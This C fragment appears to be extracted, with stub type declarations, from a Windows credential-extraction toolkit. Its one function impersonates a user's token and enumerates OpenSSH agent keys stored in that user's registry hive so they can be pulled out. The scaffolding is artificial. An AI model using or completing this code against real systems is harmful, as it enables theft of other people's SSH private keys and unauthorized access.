
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_3__ TYPE_1__ ;


typedef char wchar_t ;
struct TYPE_3__ {char* pSid; scalar_t__ hToken; int * member_1; int * member_0; } ;
typedef int PKULL_M_REGISTRY_HANDLE ;
typedef scalar_t__ LPCWSTR ;
typedef TYPE_1__ KUHL_M_DPAPI_SSH_TOKEN ;
typedef int HKEY ;
typedef int DWORD ;
typedef scalar_t__ BOOL ;


 int CloseHandle (scalar_t__) ;
 scalar_t__ ConvertStringSidToSid (scalar_t__,char**) ;
 scalar_t__ FALSE ;
 int KEY_READ ;
 int KEY_WOW64_64KEY ;
 int LPTR ;
 scalar_t__ LocalAlloc (int ,int) ;
 int LocalFree (char*) ;
 int PRINT_ERROR_AUTO (char*) ;
 int kprintf (char*,...) ;
 int kuhl_m_dpapi_ssh_getKey (int ,int ,int,char**,scalar_t__) ;
 int kuhl_m_dpapi_ssh_impersonate ;
 int kuhl_m_token_displayAccount (scalar_t__,scalar_t__) ;
 int kull_m_registry_RegCloseKey (int ,int ) ;
 scalar_t__ kull_m_registry_RegEnumKeyEx (int ,int ,int,char*,int*,int *,int *,int *,int *) ;
 scalar_t__ kull_m_registry_RegOpenKeyEx (int ,int ,char*,int ,int,int *) ;
 scalar_t__ kull_m_registry_RegQueryInfoKey (int ,int ,int *,int *,int *,int*,int*,int *,int *,int *,int *,int *,int *) ;
 scalar_t__ kull_m_string_args_byName (int,char**,char*,int *,int *) ;
 scalar_t__ kull_m_token_getTokensUnique (int ,TYPE_1__*) ;

void kuhl_m_dpapi_ssh_keys4user(PKULL_M_REGISTRY_HANDLE hRegistry, HKEY hUser, LPCWSTR szSID, int argc, wchar_t * argv[])
{
 HKEY hKeys, hEntry;
 DWORD i, nbSubKeys, szMaxSubKeyLen, szKey;
 wchar_t * keyName;
 KUHL_M_DPAPI_SSH_TOKEN tokenData = {((void*)0), ((void*)0)};
 BOOL tokenToClose = FALSE;

 if(kull_m_registry_RegOpenKeyEx(hRegistry, hUser, L"Software\\OpenSSH\\Agent\\Keys", 0, KEY_WOW64_64KEY | KEY_READ, &hKeys))
 {
  if(szSID && kull_m_string_args_byName(argc, argv, L"impersonate", ((void*)0), ((void*)0)))
  {
   kprintf(L" * Trying to get an impersonation token for %s: ", szSID);
   if(ConvertStringSidToSid(szSID, &tokenData.pSid))
   {
    if(tokenToClose = kull_m_token_getTokensUnique(kuhl_m_dpapi_ssh_impersonate, &tokenData))
    {
     kprintf(L"   ");
     kuhl_m_token_displayAccount(tokenData.hToken, FALSE);
    }
    else PRINT_ERROR_AUTO(L"kull_m_token_getTokensUnique/kull_m_token_getTokensUnique");
   }
   else PRINT_ERROR_AUTO(L"ConvertStringSidToSid");
  }

  if(kull_m_registry_RegQueryInfoKey(hRegistry, hKeys, ((void*)0), ((void*)0), ((void*)0), &nbSubKeys, &szMaxSubKeyLen, ((void*)0), ((void*)0), ((void*)0), ((void*)0), ((void*)0), ((void*)0)))
  {
   szMaxSubKeyLen++;
   if(keyName = (wchar_t *) LocalAlloc(LPTR, (szMaxSubKeyLen + 1) * sizeof(wchar_t)))
   {
    for(i = 0; i < nbSubKeys; i++)
    {
     szKey = szMaxSubKeyLen;
     if(kull_m_registry_RegEnumKeyEx(hRegistry, hKeys, i, keyName, &szKey, ((void*)0), ((void*)0), ((void*)0), ((void*)0)))
     {
      kprintf(L"\n   [%s] ", keyName);
      if(kull_m_registry_RegOpenKeyEx(hRegistry, hKeys, keyName, 0, KEY_READ, &hEntry))
      {
       kprintf(L"\n");
       kuhl_m_dpapi_ssh_getKey(hRegistry, hEntry, argc, argv, tokenData.hToken);
       kull_m_registry_RegCloseKey(hRegistry, hEntry);
      }
      else PRINT_ERROR_AUTO(L"kull_m_registry_RegOpenKeyEx");
     }
    }
    LocalFree(keyName);
   }
  }
  else PRINT_ERROR_AUTO(L"kull_m_registry_RegQueryInfoKey");

  if(tokenData.pSid)
   LocalFree(tokenData.pSid);
  if(tokenToClose && tokenData.hToken)
   CloseHandle(tokenData.hToken);
  kull_m_registry_RegCloseKey(hRegistry, hKeys);
 }
}
